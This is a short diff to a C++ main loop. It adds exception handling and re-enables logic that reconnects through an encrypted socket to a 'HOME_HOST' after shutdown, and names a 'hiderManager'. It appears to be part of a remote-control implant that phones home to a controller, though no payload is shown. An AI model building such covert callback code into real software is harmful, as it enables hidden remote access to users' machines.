@@ -35,14 +35,26 @@ int main() {
     bool cont = true;
     while (cont)
     {
-        loopIter(conn, swm, hiderManager);
+        try {
+            loopIter(conn, swm, hiderManager);
+        } catch (const std::exception& e) {
+            // Handle the exception
+            std::cerr << "Maneger: Global Exception caught: " << e.what() << std::endl;
+            const std::string err(e.what());
+            conn->sendResponce(ERROR_FROM_UNKNOWN_SOURCE, err);
+        }
         std::cout << "compleated loop iter\n";
-        // if (conn->checkShutdown()) {
-        //     if (EncSocketConnection::connectEncTCP(HOME_HOST, PORT, conn) != SUCCSESS) {
-        //         std::cerr << "Maneger: Connection home failed after shutDown\n";
-        //         exit(EXIT_FAILURE);
-        //     }
-        // }
+        try {
+            if (conn->checkShutdown()) {
+                if (EncSocketConnection::connectEncTCP(HOME_HOST, PORT, conn) != SUCCSESS) {
+                    std::cerr << "Maneger: Connection home failed after shutDown\n";
+                    exit(EXIT_FAILURE);
+                }
+            }
+        } catch (const std::exception& e) {
+            std::cerr << "Maneger: checking for shutdown failed, exiting\n";
+            exit(EXIT_FAILURE);
+        }
     }
 
     return EXIT_SUCCESS;
